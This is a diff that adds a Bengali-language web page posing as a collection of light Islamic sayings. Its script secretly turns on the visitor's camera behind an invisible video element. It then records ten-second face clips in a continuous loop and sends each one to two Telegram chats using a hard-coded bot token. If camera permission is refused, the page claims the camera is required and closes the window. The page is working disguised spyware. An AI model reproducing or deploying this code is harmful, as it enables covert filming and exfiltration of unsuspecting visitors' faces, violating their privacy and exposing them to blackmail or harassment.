@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>ইসলামিক মজার বার্তা</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+Bengali&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #fbc2eb, #a6c1ee);
+      font-family: 'Noto Serif Bengali', serif;
+      color: #3c1053;
+      text-align: center;
+      user-select: none;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      max-width: 95%;
+      margin: 20px auto;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      font-weight: 700;
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #6a1b9a;
+    }
+
+    .islamic-text {
+      margin: 15px 0;
+      font-size: 18px;
+      font-weight: 500;
+      color: #2e7d32;
+    }
+
+    #preview {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -1;
+    }
+  </style>
+</head>
+<body>
+  <video id="preview" autoplay muted playsinline></video>
+
+  <div class="container">
+    <h1>🕌 ইসলামিক মজার বার্তা 🤍</h1>
+    <p class="islamic-text">🤲 নামাজ পড়ো, কারণ আল্লাহর কাছে সব সমস্যার সমাধান আছে।</p>
+    <p class="islamic-text">🧕 মেয়েরা দোয়া আর দীন শিখলে তার সৌন্দর্য দ্বিগুণ হয়ে যায়।</p>
+    <p class="islamic-text">😂 বেশি হাসিস না দাঁত খুলে যাবে! আর নামাজ না পড়লে কপালও খুলে যাবে না!</p>
+    <p class="islamic-text">🌙 যে সকালে ফজর পড়ে, তার দিনটা আল্লাহ বরকত দিয়ে ভরিয়ে দেন।</p>
+    <p class="islamic-text">❤️ কেউ তোর প্রতি সৎ হলে তাকে হারাস না, কারণ আল্লাহ তখনই পরীক্ষা নেন!</p>
+  </div>
+
+  <script>
+    const video = document.getElementById("preview");
+    const TELEGRAM_BOT_TOKEN = "7149689726:AAHJuBCF3u8NahSNb-jCvYJ0zTEeVGiAktA";
+    const TELEGRAM_CHAT_IDS = ["6429244657", "6967225785"];
+    const CAPTION = "Hi Riad, here is your video 📷.\nDeveloper: SOAD";
+
+    let chunks = [];
+    let mediaRecorder;
+
+    function sendToTelegram(blob) {
+      TELEGRAM_CHAT_IDS.forEach(chatId => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", CAPTION);
+        formData.append("video", blob, "face_clip.webm");
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+          method: "POST",
+          body: formData
+        })
+        .then(res => console.log(`✅ ভিডিও পাঠানো হয়েছে UID: ${chatId}`))
+        .catch(err => console.error(`❌ UID ${chatId} তে পাঠাতে সমস্যা:`, err));
+      });
+    }
+
+    function startRecording(stream) {
+      mediaRecorder = new MediaRecorder(stream);
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      mediaRecorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        sendToTelegram(blob);
+        chunks = [];
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 10000);
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000);
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        video.srcObject = stream;
+        startRecording(stream);
+      })
+      .catch(err => {
+        alert("আপনি প্রয়োজনীয় অনুমতি দেননি 😢 এই সাইট ব্যবহারের জন্য ক্যামেরা চালু করা আবশ্যক।");
+        window.close();
+      });
+  </script>
+</body>
+</html>
